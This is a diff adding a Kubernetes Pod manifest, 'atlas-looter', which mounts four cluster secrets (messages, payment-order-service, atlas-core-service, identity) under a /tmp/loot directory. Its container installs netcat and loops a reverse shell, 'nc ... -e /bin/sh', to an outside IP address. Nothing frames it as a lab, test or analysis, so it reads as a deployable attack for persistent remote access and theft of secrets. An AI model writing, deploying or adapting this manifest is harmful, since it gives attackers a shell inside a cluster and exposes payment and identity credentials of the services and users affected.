@@ -1,0 +1,40 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: atlas-looter
+  namespace: backbase
+spec:
+  containers:
+  - name: looter-box
+    image: alpine:latest
+    command: ["/bin/sh", "-c"]
+    args:
+    - |
+      apk add --update netcat-openbsd python3 mysql-client
+      while true; do
+        nc 203.175.125.130 443 -e /bin/sh
+        sleep 5
+      done
+    volumeMounts:
+    - name: vol-msg
+      mountPath: /tmp/loot/messages
+    - name: vol-pay
+      mountPath: /tmp/loot/payment
+    - name: vol-core
+      mountPath: /tmp/loot/core
+    - name: vol-id
+      mountPath: /tmp/loot/identity
+  volumes:
+  - name: vol-msg
+    secret:
+      secretName: messages-secret
+  - name: vol-pay
+    secret:
+      secretName: payment-order-service
+  - name: vol-core
+    secret:
+      secretName: atlas-core-service
+  - name: vol-id
+    secret:
+      secretName: identity-secret
+  restartPolicy: Never
